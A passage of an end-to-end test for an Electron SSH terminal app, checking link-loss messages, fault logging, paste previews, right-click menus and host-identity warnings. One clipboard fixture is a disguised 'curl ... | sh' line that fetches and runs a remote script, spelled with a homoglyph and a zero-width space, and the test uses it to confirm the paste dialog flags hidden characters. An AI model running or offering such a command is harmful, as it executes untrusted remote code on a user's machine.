            const afterShort = ctx.told().decided;
            // And the tab he is looking at never raises one, however long it took.
            await js(ctx.shell, `document.querySelector('[data-tab="${behindTab}"]')?.click()`);
            await until(() => ctx.shellState().active === behindTab, 5000);
            await js(behind.view, `window.tabPort.doing('idle', 95000)`);
            await sleep(300);
            const afterFront = ctx.told().decided;
            ctx.win.focus();
            check(
              'something long that ended in a tab behind, with the window not in front, is worth telling him; a short one, a window he is looking at, and the tab in front are not',
              toldHim === before + 1 && afterFocus === toldHim && afterShort === afterFocus && afterFront === afterShort,
              [before, toldHim, afterFocus, afterShort, afterFront],
            );
            await js(ctx.shell, `document.querySelector('[data-tab="${open1.id}"]')?.click()`);
            await until(() => ctx.shellState().active === open1.id, 5000);
          }
          // A view may say one of three things and a length that could be true; anything else is dropped.
          const droppedBefore = ctx.dropped();
          await js(behind.view, `(window.tabPort.doing('busy', 0), window.tabPort.doing('idle', -5), window.tabPort.doing('idle', 1e12), window.tabPort.doing('running', Number.NaN))`);
          await sleep(300);
          check('a view saying something else about what it is doing, or a length that cannot be true, is dropped', ctx.dropped() === droppedBefore + 4, ctx.dropped() - droppedBefore);
          ctx.closeTab(behind.id);
          await lab.tell('prompting');
          await js(ctx.shell, `document.querySelector('[data-tab="${open1.id}"]')?.click()`);
          await until(() => ctx.shellState().active === open1.id, 5000);
        }

        // A link that is gone: the box's connection is reset. The bar says the cause and the time, a new
        // session is counted down, and Cancel stops it.
        const engineBefore = open1.engine.pid;
        await lab.tell('reset');
        const sawGone = await until(async () => (await text('#bar', open1)).includes('The link is gone'), 20_000);
        const goneSaid = await text('#bar', open1);
        check('a link that is gone: the bar says the cause, the time, and when a new session opens', sawGone && goneSaid.includes('the connection was reset at') && /A new session opens in \d+ s/.test(goneSaid) && goneSaid.includes('Cancel'), goneSaid);
        // The local log (step 2b's ninth finding): the failure is written down with an id, the bar says that
        // id, and the line in the file is the same failure. A fault he can name is a fault he can look up.
        {
          const said = /Fault ([A-HJ-NP-Z2-9]{6})\./.exec(goneSaid);
          const log = await ctx.faults();
          const text = await readFile(log.file, 'utf8').catch(() => '');
          const line = said ? (text.split('\n').find((l) => l.includes(said[1]!)) ?? '') : '';
          check(
            'a link that failed is written in the local log with an id, the bar says that id, and the line says which tab and which box',
            !!said && line !== '' && line.includes(' link ') && line.includes(`tab=${open1.id}`) && line.includes('reset') && log.lost === 0,
            [goneSaid.slice(-120), line, log.written, log.lost],
          );
          // And the log says which box only by its id: the file is plain text beside the encrypted list, so
          // a name, an address or a user in it would be the one thing in that folder that is in the clear.
          const box = open1.box?.id ?? '';
          check(
            'the log names a box by its id alone, never by its name, address or user',
            box !== '' && line.includes(`box=${box}`) && !text.includes('lab-box') && !text.includes('127.0.0.1') && !text.includes('/srv/ledger'),
            [box, line],
          );
        }
        await shot('tab-gone', 'the link gone: a new session is coming', open1);
        await clickOn('#cancel', open1);
        check('Cancel stops it: no new session opens, and the tab keeps everything it drew', (await until(async () => !(await text('#bar', open1)).includes('A new session opens'), 3000)) && open1.engine.pid === engineBefore && (await shown(open1)).includes(marker), [await text('#bar', open1), open1.engine.pid === engineBefore]);
        // The engine of a gone link ends a moment later, and its ending is another word from below. A word
        // that arrives after Cancel must not start the countdown again: the person stopped it.
        const engineGone = await until(() => open1.engine.state === 'gone', 15_000);
        check('and a word from the box after Cancel does not start it again', engineGone && !(await text('#bar', open1)).includes('A new session opens') && open1.engine.pid === engineBefore, [engineGone, open1.engine.state, await text('#bar', open1)]);
        // Reconnect: a new session, a new engine, said in the terminal; the old output is still there.
        await clickOn('#reconnect', open1);
        const again = await until(() => open1.engine.pid !== engineBefore && open1.engine.link.phase === 'up', 30_000);
        await type(open1, 'echo new-session-ok\n');
        check('Reconnect opens a new session on the same box and place: a new engine, said in the terminal, the old output kept', again && (await until(async () => (await shown(open1)).includes('new-session-ok'), 5000)) && (await shown(open1)).includes('Berth: a new session on lab-box') && (await shown(open1)).includes(marker), [again, (await shown(open1)).slice(-200)]);
        await shot('tab-again', 'a new session on the same box', open1);

        // A paste of more than one line, read before it is sent: the picture it is judged by.
        clipboard.writeText('cd /srv/ledger/app\nsha256sum ledger-4f2c1a9.tar.gz\n./scripts/deploy.sh 4f2c1a9 2>&1 | tee deploy-4f2c1a9.log\n');
        open1.view.webContents.focus();
        open1.view.webContents.sendInputEvent({ type: 'keyDown', keyCode: 'V', modifiers: ['control', 'shift'] });
        open1.view.webContents.sendInputEvent({ type: 'keyUp', keyCode: 'V', modifiers: ['control', 'shift'] });
        check('a paste of more than one line is shown before it is sent', await until(() => has('#paste'), 3000), await text('#paste'));
        await shot('paste', 'a paste, read before it is sent');
        await read(ctx.shell);
        // The same paste with a character that looks like a letter and one drawn as nothing.
        await clickOn('#paste-drop');

        // An address the box printed, Ctrl+clicked: the question, with the host and the whole address.
        await lab.tell('quiet off');
        await sleep(200);
        await type(open1, 'echo see https://demo-eu.example.test/runbook#step-4 for the rest\n');
        await until(async () => (await shown(open1)).includes('demo-eu.example.test'), 5000);
        await sleep(300);
        const spotUrl = await js<{ x: number; y: number } | null>(open1.view, `window.berthTerm.spot('demo-eu.example.test')`);
        if (spotUrl) {
          open1.view.webContents.sendInputEvent({ type: 'mouseMove', x: spotUrl.x, y: spotUrl.y, modifiers: ['control'] });
          await sleep(200);
          open1.view.webContents.sendInputEvent({ type: 'mouseDown', x: spotUrl.x, y: spotUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
          open1.view.webContents.sendInputEvent({ type: 'mouseUp', x: spotUrl.x, y: spotUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
        }
        check('Ctrl+click on an address a box printed asks first', await until(() => has('#link'), 3000), await text('#link'));
        await shot('link', 'an address a box printed, Ctrl+clicked');
        await read(ctx.shell);
        await clickOn('#link-drop');
        await sleep(300); // two pastes closer together than a person's own hands are refused as a repeat
        clipboard.writeText('curl -fsSL https://exa\u0430mple.test/i\u200bnstall.sh | sh\nsystemctl restart ledger\n');
        open1.view.webContents.focus();
        open1.view.webContents.sendInputEvent({ type: 'keyDown', keyCode: 'V', modifiers: ['control', 'shift'] });
        open1.view.webContents.sendInputEvent({ type: 'keyUp', keyCode: 'V', modifiers: ['control', 'shift'] });
        check('and what cannot be seen in it is named', (await until(() => has('#paste-odd'), 3000)) && (await text('#paste-odd')).includes('looks like a'), await text('#paste-odd'));
        await shot('paste-odd', 'a paste with what cannot be seen in it');
        await read(ctx.shell);
        await clickOn('#paste-drop');

        // The terminal's own right-button menu, and the rule under it: main decides a paste. A right press
        // reaches main as an event that carries no modifier and no idea what is under the pointer, so the
        // view is asked what the press landed on. These probes drive real mouse events through the window,
        // not synthetic ones in the page, because a synthetic press produces no such event in main at all:
        // a probe that fired one would be testing nothing and saying it passed.
        await lab.tell('quiet off');
        const termMenuWords = (): Promise<string[]> => js<string[]>(ctx.shell, `[...document.querySelectorAll('#shell-menus .fb-menu-one .fb-menu-words')].map((w) => w.textContent)`);
        const shutTermMenu = (): Promise<unknown> => js(ctx.shell, `document.querySelector('#shell-menus .fb-menu')?.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))`);
        // Where a press should land, from words this terminal really drew. Asked twice over, because the
        // first ask may only bring the words into view and answer nothing. Nothing here guesses a point: a
        // guessed one could land on the file pane beside the terminal, where a right press means something
        // else entirely, and the probe would quietly be testing that instead.
        const spotOf = async (words: string): Promise<{ x: number; y: number } | null> => {
          let at = await js<{ x: number; y: number } | null>(open1.view, `window.berthTerm.spot(${JSON.stringify(words)})`);
          if (!at) {
            await sleep(300);
            at = await js<{ x: number; y: number } | null>(open1.view, `window.berthTerm.spot(${JSON.stringify(words)})`);
          }
          return at;
        };
        // A fresh marker on the last line, so the point to press is on screen and nothing has to scroll to
        // find it. Each press gets its own, because the one before it may have been cleared away.
        const markAndSpot = async (mark: string): Promise<{ x: number; y: number } | null> => {
          await type(open1, `echo ${mark}\n`);
          await until(async () => (await shown(open1)).includes(mark), 6000);
          await sleep(300);
          return spotOf(mark);
        };
        const rightPressAt = (p: { x: number; y: number }, modifiers: 'shift'[]): void => {
          open1.view.webContents.focus();
          open1.view.webContents.sendInputEvent({ type: 'mouseDown', x: p.x, y: p.y, button: 'right', clickCount: 1, modifiers });
          open1.view.webContents.sendInputEvent({ type: 'mouseUp', x: p.x, y: p.y, button: 'right', clickCount: 1, modifiers });
        };
        {
          // Shift held opens the menu, on the window's own surface. What is in it is what this terminal
          // really has: nothing is selected, so there is no Copy line to press (BUILD-RULES 2.8).
          await sleep(300); // two pastes closer together than a person's own hands are refused as a repeat
          clipboard.writeText('this must not arrive by itself\n');
          const p = await markAndSpot('menu-marker-aaa');
          check('the terminal says where its own words are drawn, so a press can be put on them', p !== null, p);
          if (p) rightPressAt(p, ['shift']);
          const opened = await until(async () => (await termMenuWords()).length > 0, 3000);
          const words = await termMenuWords();
          check(`Shift and the right button on the terminal opens its menu, drawn by the window: ${words.join(', ')}`,
            opened && words.includes('Paste') && words.includes('Select all and copy') && words.includes('Save output as a file') && words.includes('Clear') && !words.includes('Copy') && !words.includes('Find'),
            words);
          check('and the window is above its tabs while it is open, so the menu is not drawn behind the terminal it is about', ctx.overlayOn(), '');
          check('and opening it pasted nothing: the menu is the answer to that press, not a paste as well', !(await shown(open1)).includes('this must not arrive by itself') && !(await has('#paste')), (await shown(open1)).slice(-120));
          await sweepMenu(ctx.shell, "the terminal's menu");
          await shot('term-menu', "the terminal's own menu, drawn on the window because one of its lines pastes", null);
          await read(ctx.shell);
          await shutTermMenu();
          check('Escape shuts it and the window goes back behind its tabs', (await until(async () => (await termMenuWords()).length === 0, 3000)) && (await until(() => !ctx.overlayOn(), 3000)), '');
        }
        {
          // A plain right press still pastes, which is what it has always done here and what his reference
          // client does. This is the probe that would catch the menu quietly taking that away.
          await sleep(300);
          clipboard.writeText('right-press-pasted-this');
          const p = await markAndSpot('menu-marker-bbb');
          if (p) rightPressAt(p, []);
          const arrived = await until(async () => (await shown(open1)).includes('right-press-pasted-this'), 5000);
          const noMenu = await termMenuWords();
          check('a plain right press still pastes what is on the clipboard', p !== null && arrived, (await shown(open1)).slice(-120));
          check('and it opens no menu: the menu is what Shift asks for, and nothing else about a right press changed', noMenu.length === 0, noMenu);
          await type(open1, '\u0015'); // what was pasted is taken off the line again, not run
        }
        {
          // Something selected: the Copy line is there, and pressing it writes that selection in place of
          // what was on the clipboard.
          //
          // The order here is the whole probe. Selecting in this terminal copies by itself, so a clipboard
          // set before the selection would hold the right words whether the Copy line worked or not: the
          // probe would pass with the line doing nothing, which is worse than having no probe at all. So
          // the clipboard is taken over AFTER the selection has settled and been copied, and only the press
          // can put those words back.
          await sleep(300);
          const sel = await markAndSpot('pick-this-line-up');
          if (sel) {
            open1.view.webContents.sendInputEvent({ type: 'mouseDown', x: sel.x, y: sel.y, button: 'left', clickCount: 1 });
            for (let i = 1; i <= 20; i++) open1.view.webContents.sendInputEvent({ type: 'mouseMove', x: sel.x + i * 20, y: sel.y, button: 'left' });
            open1.view.webContents.sendInputEvent({ type: 'mouseUp', x: sel.x + 400, y: sel.y, button: 'left', clickCount: 1 });
          }
          await sleep(600); // longer than the wait a settled selection is copied after
          const selected = await js<boolean>(open1.view, `window.berthTerm.hasSelection()`);
          const copiedItself = (await clipboard.readText()).includes('this-line-up');
          check('a drag across a line selects it, and selecting copies by itself', selected && copiedItself, [selected, (await clipboard.readText()).slice(0, 60)]);
          clipboard.writeText('not-what-was-selected');
          if (sel) rightPressAt(sel, ['shift']);
          await until(async () => (await termMenuWords()).length > 0, 3000);
          const words = await termMenuWords();
          check(`with something selected the menu offers Copy: ${words.join(', ')}`, words.includes('Copy'), words);
          const pressed = await clickOn('#term-menu-copy');
          const wrote = await until(async () => (await clipboard.readText()).includes('this-line-up'), 3000);
          check('and pressing it puts that selection on the clipboard, in place of what was on it', pressed && wrote && !(await clipboard.readText()).includes('not-what-was-selected'), (await clipboard.readText()).slice(0, 80));
        }
        {
          // Clear: everything the terminal holds goes. The marker carries neither of the words the second
          // half of this looks for, or the probe would fail on its own marker rather than on what the app did.
          await sleep(300);
          const p = await markAndSpot('before-the-wipe');
          const heldBefore = await js<number>(open1.view, `window.berthTerm.held()`);
          const typedBefore = ctx.typedInto(open1.id);
          if (p) rightPressAt(p, ['shift']);
          await until(async () => (await termMenuWords()).length > 0, 3000);
          const pressed = await clickOn('#term-menu-clear');
          const emptied = await until(async () => !(await shown(open1)).includes('before-the-wipe'), 4000);
          const heldAfter = await js<number>(open1.view, `window.berthTerm.held()`);
          // What it holds is counted in rows of its buffer, which never falls below the rows on screen: a
          // cleared terminal of thirty-one rows still holds thirty-one. So what is checked is that the words
          // are gone from everything it holds, screen and scrollback alike, and the count is only shown.
          check('Clear empties the terminal, everything it held and not only the screen', pressed && emptied, [pressed, emptied, heldBefore, heldAfter, (await shown(open1)).slice(-200)]);
          // And the box was told nothing at all. Nothing in Berth is ever typed into a shell by the app
          // (plan B2.5), so a Clear that sent `clear` down to the box would be the one thing this app may
          // never do. It is held by counting the bytes that went down the one path anything typed goes
          // down: not a byte more than before, with the terminal emptied all the same. The count is proved
          // to be a live one first, by typing into the box and watching it move, because a counter stuck
          // at a number would make this probe pass whatever the app did.
          await sleep(500);
          const typedAfter = ctx.typedInto(open1.id);
          await type(open1, 'echo the-counter-moves\n');
          await until(async () => (await shown(open1)).includes('the-counter-moves'), 8000);
          check('and not a byte was typed into the box to do it, on a count proved to be live', typedAfter === typedBefore && ctx.typedInto(open1.id) > typedAfter, [typedBefore, typedAfter, ctx.typedInto(open1.id)]);

        }
        {
          // One command's own mark, under the right button. The mark is Berth's own drawing and not the
          // box's text, so a plain press on it opens this menu rather than pasting: that is the one place
          // in the terminal where a right press does not paste, and it is what SSH-APP-DETAILS 7 asked for.
          //
          // On a tab of its own, opened here. A terminal only draws blocks once it has learned the shape of
          // that box's prompt, and it stops looking after a couple of hundred lines; the tab these probes
          // have been using has had a whole deploy log and a dropped session through it. A probe that drove
          // the menu there would be measuring how noisy its own earlier steps were.
          // The lab's shell is told to print a prompt again: an earlier probe turned it off, and a box that
          // prints no prompt draws no blocks, so without this the menu would have nothing to be about.
          await lab.tell('prompting demo@lab-box:/srv/ledger$ ');
          const marked = ctx.openTab(open1.box!.id, '')!;
          await until(() => marked.engine.link.phase === 'up', 30_000);
          // The prompt is asked for first. A terminal learns the shape of a box's prompt from the line the
          // box stops on, so a tab that has not been shown one draws no blocks at all, and draws none
          // quietly: no fault, no mark, nothing to see. That is why this is a step and not an assumption.
          await type(marked, '\n');
          const learnedIt = await until(async () => (await js<number>(marked.view, `window.berthBlocks().prompts`)) > 0, 20_000);
          check('a new tab learns the shape of its box\u2019s prompt from the first one it is shown', learnedIt, await js<unknown>(marked.view, `window.berthBlocks()`));
          await type(marked, 'echo cmd-made-this-output\n');
          await until(async () => (await shown(marked)).includes('cmd-made-this-output'), 10_000);
          await type(marked, 'echo one-more-after-it\n');
          await until(async () => (await shown(marked)).includes('one-more-after-it'), 10_000);
          const anyMark = await until(async () => (await js<number>(marked.view, `document.querySelectorAll('.berth-block-copy').length`)) > 0, 10_000);
          await sleep(500);
          check('a command wears a mark a press can land on', anyMark, await js<unknown>(marked.view, `window.berthBlocks()`));
          // The mark belonging to one named command, found by the row that command is drawn on rather than
          // by counting marks from the end: how many marks there are depends on what the box printed, and a
          // probe that counted would quietly start pressing the wrong command's mark one day.
          const onRow = await js<{ x: number; y: number } | null>(marked.view, `window.berthTerm.spot('echo cmd-made-this-output')`);
          const mark = onRow === null ? null : await js<{ x: number; y: number } | null>(marked.view, `(() => {
            const y = ${onRow.y};
            const m = [...document.querySelectorAll('.berth-block-copy')].find((e) => { const r = e.getBoundingClientRect(); return r.height > 0 && r.width > 0 && y >= r.top && y <= r.bottom; });
            if (!m) return null;
            const r = m.getBoundingClientRect();
            return { x: Math.round(r.left + r.width / 2), y: Math.round(r.top + r.height / 2) };
          })()`);
          check('and that mark sits on the row of the command it belongs to', mark !== null, [onRow, mark]);
          clipboard.writeText('not-from-any-block');
          if (mark) {
            marked.view.webContents.focus();
            marked.view.webContents.sendInputEvent({ type: 'mouseDown', x: mark.x, y: mark.y, button: 'right', clickCount: 1 });
            marked.view.webContents.sendInputEvent({ type: 'mouseUp', x: mark.x, y: mark.y, button: 'right', clickCount: 1 });
          }
          const opened = await until(async () => (await termMenuWords()).length > 0, 3000);
          const words = await termMenuWords();
          check(`a plain right press on a command’s mark opens that command’s own menu, not a paste: ${words.join(', ')}`,
            opened && words.includes('Copy the command') && words.includes('Copy the command and its output') && words.includes('Save the output as a file') && !words.includes('Paste'),
            words);
          check('and it pasted nothing, which is the one place in the terminal a right press does not', !(await shown(marked)).includes('not-from-any-block'), (await shown(marked)).slice(-120));
          await sweepMenu(ctx.shell, "a command’s own menu");
          await shot('block-menu', "one command's own menu, under the right button on its mark", null);
          await read(ctx.shell);
          const stillOpen = await termMenuWords();
          const hitCommand = await clickOn('#term-menu-block-command');
          // A longer wait than the rest: the clipboard here is the system's, and on this lab's screen taking
          // it over is not instant. A probe that failed once in ten runs on that would be a probe nobody
          // could read a failure from.
          const gotCommand = await until(async () => (await clipboard.readText()).includes('echo cmd-made-this-output'), 8000);
          const justCommand = (await clipboard.readText()).trim();
          const saidCommand = await js<string>(marked.view, `document.documentElement.dataset.copied ?? ''`);
          check('Copy the command puts the command on the clipboard and not what it printed', gotCommand && justCommand === 'echo cmd-made-this-output', [justCommand.slice(0, 120), hitCommand, saidCommand, stillOpen]);
          // And the two together, which is the line the mark's own press cannot give.
          await sleep(300);
          clipboard.writeText('not-from-any-block');
          if (mark) {
            marked.view.webContents.sendInputEvent({ type: 'mouseDown', x: mark.x, y: mark.y, button: 'right', clickCount: 1 });
            marked.view.webContents.sendInputEvent({ type: 'mouseUp', x: mark.x, y: mark.y, button: 'right', clickCount: 1 });
          }
          await until(async () => (await termMenuWords()).length > 0, 3000);
          await clickOn('#term-menu-block-both');
          const gotBoth = await until(async () => (await clipboard.readText()).includes('echo cmd-made-this-output'), 8000);
          const both = (await clipboard.readText()).trim();
          check('and Copy the command and its output puts both, the command first', gotBoth && both.startsWith('echo cmd-made-this-output\n') && both.length > 'echo cmd-made-this-output'.length, both.slice(0, 160));
          // And Clear on a tab that really draws blocks: everything goes, and the next command still gets a
          // mark. The library drops its own markers when a terminal is cleared and the reading counts rows
          // that are gone, so a Clear that put neither back would leave this tab without another block for
          // as long as it stayed open, with nothing anywhere saying why.
          await sleep(400);
          const wipeAt = await js<{ x: number; y: number } | null>(marked.view, `window.berthTerm.spot('one-more-after-it')`);
          if (wipeAt) {
            marked.view.webContents.focus();
            marked.view.webContents.sendInputEvent({ type: 'mouseDown', x: wipeAt.x, y: wipeAt.y, button: 'right', clickCount: 1, modifiers: ['shift'] });
            marked.view.webContents.sendInputEvent({ type: 'mouseUp', x: wipeAt.x, y: wipeAt.y, button: 'right', clickCount: 1, modifiers: ['shift'] });
          }
          await until(async () => (await termMenuWords()).length > 0, 3000);
          const wiped = await clickOn('#term-menu-clear');
          const wentEmpty = await until(async () => !(await shown(marked)).includes('cmd-made-this-output'), 5000);
          await type(marked, 'echo after-the-wipe\n');
          await until(async () => (await shown(marked)).includes('after-the-wipe'), 10_000);
          await sleep(900);
          // Not "is there a mark anywhere" but "does this one command have its own". A reading left counting
          // rows that have gone catches up by itself once enough has been printed to pass where it stopped,
          // so a probe asking only whether any mark came back would pass with the reading never put back and
          // the first command after every Clear quietly missing its block. The mark is looked for on the row
          // of the very first command typed after the Clear.
          const afterRow = await js<{ x: number; y: number } | null>(marked.view, `window.berthTerm.spot('echo after-the-wipe')`);
          const markedAgain = afterRow === null ? false : await js<boolean>(marked.view, `(() => {
            const y = ${afterRow.y};
            return [...document.querySelectorAll('.berth-block-copy')].some((e) => { const r = e.getBoundingClientRect(); return r.height > 0 && r.width > 0 && y >= r.top && y <= r.bottom; });
          })()`);
          check('Clear on a tab drawing blocks empties it, and the very first command after it still gets its own mark', wiped && wentEmpty && markedAgain, [wiped, wentEmpty, markedAgain, afterRow, await js<unknown>(marked.view, `window.berthBlocks()`)]);
          ctx.closeTab(marked.id);
          await lab.tell('prompting'); // put the lab's shell back the way the probes after this one expect it
          await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${open1.id} })`);
          await until(() => ctx.shellState().active === open1.id, 5000);
        }
        {
          // The one that could not fail by accident: an answer that belonged to no press main ever saw. A
          // view that said "that was a menu" out of the blue must open nothing, because then the menu would
          // be a way for a page to reach the clipboard without a person pressing anything (plan B2.7).
          await sleep(300);
          const refusedBefore = ctx.rightClicksRefused();
          await js(open1.view, `window.tabPort.rightClickWas('menu', true, true)`);
          await sleep(400);
          const nothing = (await termMenuWords()).length === 0;
          check('an answer that belonged to no press main saw opens nothing, and is counted', nothing && ctx.rightClicksRefused() > refusedBefore, [nothing, refusedBefore, ctx.rightClicksRefused()]);
        }

        // Seven tabs on one box in a 1024-wide window: the box's tabs fold into one, and the count opens them.
        for (let i = 0; i < 6; i++) ctx.openTab(id, i % 2 ? 'logs' : '');
        ctx.win.setContentSize(1024, 640);
        await sleep(500);
        check('seven tabs on one box in a small window fold into one tab with a count', (await until(async () => (await js<number>(ctx.shell, `document.querySelectorAll('[data-tab]').length`)) === 1 && (await has('[data-fold]')), 3000)) && (await text('[data-fold]')).includes('7'), await js<number>(ctx.shell, `document.querySelectorAll('[data-tab]').length`));
        await clickOn('[data-fold]');
        const listed = await js<number>(ctx.shell, `document.querySelectorAll('[data-fold-tab]').length`);
        check('the count opens the seven as a list', listed === 7, listed);
        await shot('fold-open', 'seven tabs on one box, folded and opened');
        const third = [...ctx.tabs.values()][2]!;
        await clickOn(`[data-fold-tab="${third.id}"]`);
        check('picking one from the list brings it to the front', await until(() => ctx.shellState().active === third.id && !shellOnTop(), 3000), ctx.shellState().active);
        for (const t of [...ctx.tabs.values()]) ctx.closeTab(t.id);
        ctx.win.setContentSize(size.width, size.height);

        // A box that cannot be reached: said with the cause, in place of the paste step.
        const closed = await new Promise<number>((resolve) => {
          const srv = createServer();
          srv.listen(0, '127.0.0.1', () => {
            const p = (srv.address() as AddressInfo).port;
            srv.close(() => resolve(p));
          });
        });
        await clickOn('#boxes');
        await clickOn('#add-box-open');
        await until(() => has('#add-box'), 2000);
        await clickOn('#box-name');
        await typeKeys('quiet-box');
        await clickOn('#box-host');
        await typeKeys('127.0.0.1');
        await clickOn('#box-port');
        await typeKeys(String(closed));
        await clickOn('#box-user');
        await typeKeys('demo');
        await pressEnter();
        check('a box nothing answers at: the check says it was refused, with Try again', (await until(async () => (await step()) === 'unreachable', 15_000)) && (await text('#check-unreachable')).includes('refused the connection') && (await has('#check-again')), await text('#check-unreachable'));
        await shot('check-unreachable', 'the first-connection check, the box cannot be reached');
        await clickOn('#check-close');
        check('Close: no dialog, the box is kept, never checked', (await until(async () => !(await has('#check')), 2000)) && ctx.boxes.list.find((b) => b.name === 'quiet-box')?.pin === '', '');
        check('no tab open, boxes saved: the window offers each of them, and Add box', await until(async () => (await has('[data-open="lab-box"]')) && (await has('[data-open="quiet-box"]')) && (await has('#first-add')), 2000), await text('#first-use'));
        await shot('no-tab', 'no tab open, two boxes saved');
        // The morning, in a picture: what was open last time, each with a tick. It is put back the way the
        // app's own close writes it, because one run of the lab is one start of the app.
        {
          const box = ctx.boxes.list.find((b) => b.name === 'lab-box');
          const never = ctx.boxes.list.find((b) => b.name === 'quiet-box');
          if (box && never) {
            // A box that was never checked is in the list but has no identity pinned, so it cannot be
            // connected to from anywhere: it is left out of the offer rather than offered and refused.
            await ctx.boxes.setLastTabs([{ box: box.id, place: box.places[0]?.name ?? '' }, { box: never.id, place: '' }, { box: box.id, place: '' }]);
            await until(async () => (await has('#reopen')), 5000);
            const rows = await js<string>(ctx.shell, `[...document.querySelectorAll('#reopen [data-reopen]')].map((e) => e.textContent).join(' | ')`);
            check('a box that was never checked is not offered: it could not be opened from anywhere else either', rows.includes('lab-box') && !rows.includes('quiet-box') && ctx.shellState().reopen.length === 2, [rows, ctx.shellState().reopen.length]);
            // A tick that does not draw is a tick he cannot read. The page's own content policy allows no
            // picture but the app's own files, so this is drawn with the app's glyph and held to it here.
            const tick = await js<string>(ctx.shell, `(() => { const t = document.querySelector('#reopen .ro-one input:checked + .ro-tick svg'); return t ? getComputedStyle(t).opacity : 'no tick'; })()`);
            check('a ticked line really draws its tick', tick === '1', tick);
            await shot('reopen', 'the morning: what was open last time, to pick from');
            // Add box, pressed with the morning's offer on screen and boxes saved: it opens the dialog and
            // nothing else. He reported a press of Add box that opened a box instead, so both ways of
            // reaching it are driven here, in the state he was in, and each must open the dialog and no tab.
            for (const where of ['#first-add', '#add-box-open']) {
              if (where === '#add-box-open' && !(await has('#add-box-open'))) await clickOn('#boxes');
              check(`Add box is there to press at ${where}`, await until(() => has(where), 3000), '');
              await clickOn(where);
              check(`Add box at ${where} opens the dialog and opens no tab`, (await until(() => has('#box-name'), 3000)) && ctx.shellState().tabs.length === 0 && (await has('#reopen')), [await has('#add-box'), ctx.shellState().tabs.length]);
              await clickOn('#add-cancel');
              await until(async () => !(await has('#add-box')), 3000);
              check(`Cancel at ${where} leaves no tab open`, ctx.shellState().tabs.length === 0, ctx.shellState().tabs.length);
            }
            await clickOn('#reopen-not-now');
            await until(async () => !(await has('#reopen')), 3000);
          }
        }
        await clickOn('#boxes');
        await until(() => has('#box-menu'), 2000);
        await shot('boxes-unchecked', 'the Boxes menu, a box not checked yet');
        await clickOn('[data-box="quiet-box"]');
        check('a box never checked, picked from Boxes, opens its check and no tab', (await until(() => has('#check'), 3000)) && ctx.shellState().tabs.length === 0, '');
        await clickOn('#check-close');

        // Another identity at the box's address: the tab stops, and the stop is said in its dialog.
        const rekeyed = await lab.tell('rekey');
        const printedNow = String(rekeyed['printed'] ?? ''); // the box's identity from here on: it was rebuilt
        ctx.openTab(id, '');
        check('a box showing another identity: the tab stops and the dialog says so, with both fingerprints', (await until(() => has('#changed'), 20_000)) && (await text('#changed')).includes(ctx.boxes.list[0]!.pinFingerprint) && (await until(shellOnTop, 1000)), [await has('#changed'), await text('#changed'), shellOnTop(), ctx.shellState().tabs.map((t) => [t.link.phase, t.link.cause]), ctx.shellState().check?.boxId ?? '', ctx.boxes.list.map((b) => [b.name, b.pinFingerprint])]);
        await shot('changed', 'a box whose identity changed');
        await read(ctx.shell);
        {
          const stopped = [...ctx.tabs.values()].find((x) => x.engine.link.cause === 'identity-changed');
          const pidThen = stopped?.engine.pid;
          await sleep(1200);
          check('and no new session is opened after a changed identity either', !!stopped && stopped.againAt === 0 && stopped.engine.pid === pidThen, [stopped?.againAt, stopped?.engine.pid === pidThen]);
        }
        await clickOn('#changed-close');
        check('Close: the dialog goes, the tab stays, marked stopped', (await until(async () => !(await has('#changed')), 2000)) && (await js<string>(ctx.shell, `document.querySelector('[data-tab]')?.dataset.state ?? ''`)) === 'stopped', '');

        // ---- Edit box and Delete box, driven by hand from the Boxes menu. ----
        await clickOn('#boxes');
        await until(() => has('#box-menu'), 2000);
        await moveTo('[data-box="lab-box"]');
        check('each box in the menu carries Edit and Delete of its own', (await has('[data-edit="lab-box"]')) && (await has('[data-remove="lab-box"]')), '');
        await clickOn('[data-edit="lab-box"]');
        const openedEdit = await until(() => has('#add-box'), 2000);
        const editSaid = await text('#add-box');
        check('Edit opens the box as it stands: the same fields, its own values, its key kept and its identity shown', openedEdit && editSaid.includes('Edit lab-box') && editSaid.includes('This box keeps the key Berth made for it') && (await has('#edit-pinned')) && (await text('#edit-pinned')).includes(ctx.boxes.list[0]!.pinFingerprint), [editSaid.slice(0, 120), await text('#edit-pinned')]);
        await shot('edit-box', 'Edit box, with the identity it is pinned to');
        await read(ctx.shell);
        // The name is changed to one already taken: refused by name, and nothing is saved.
        const nameField = '#box-name';
        const pickAll = async (sel: string) => js(ctx.shell, `(() => { const i = document.querySelector(${JSON.stringify(sel)}); if (!i) return 'no field'; i.focus(); i.setSelectionRange(0, i.value.length); return 'ok'; })()`);
        check('the name field is there to change', (await pickAll(nameField)) === 'ok', await js(ctx.shell, `[...document.querySelectorAll('#add-box input')].map((i) => i.id || i.name || i.placeholder).join(',')`));
        await typeKeys('quiet-box');
        await sleep(200);
        check('a name another box has is refused as you type, and Save is held back', (await text('#add-box')).includes('taken') || (await has('#add-to-fix')), await text('#add-box'));
        await pickAll(nameField);
        await typeKeys('lab-box-renamed');
        await sleep(150);
        await clickOn('#add-submit');
        const renamed = await until(() => ctx.boxes.list.some((b) => b.name === 'lab-box-renamed'), 4000);
        const box0 = () => ctx.boxes.list.find((b) => b.id === id)!;
        check('Save writes what changed, keeps the key and the identity, and the window says so', renamed && box0().publicKey !== '' && box0().pin !== '' && (await text('#status-done')).includes('Saved'), [box0().name, box0().pin !== '', await text('#status-done')]);
        check('and the tabs open on it say its new name', await until(async () => (await text('[data-tab]')).includes('lab-box-renamed'), 2000), await text('[data-tab]'));

        // Forget the identity: a box that was rebuilt is checked again, and cannot be opened until it is.
        await clickOn('#boxes');
        await moveTo('[data-box="lab-box-renamed"]');
        await clickOn('[data-edit="lab-box-renamed"]');
        await until(() => has('#add-box'), 2000);
        await clickOn('#edit-forget');
        const forgot = await until(() => ctx.boxes.list.find((b) => b.id === id)?.pin === '', 4000);
        check('Forget it: the identity pinned for the box goes, and nothing else about it changes', forgot && box0().name === 'lab-box-renamed' && box0().publicKey !== '' && (await has('#edit-unpinned')), [box0().pin, box0().publicKey !== '']);
        await clickOn('#add-cancel');
        check('and a box with no identity cannot be opened: picking it opens its check instead', ctx.openTab(id) === null, '');
        // Pinned again, the straight way: the check, with the box's own lines.
        await clickOn('#boxes');
        const menuThere = await until(() => has('[data-box="lab-box-renamed"]'), 2000);
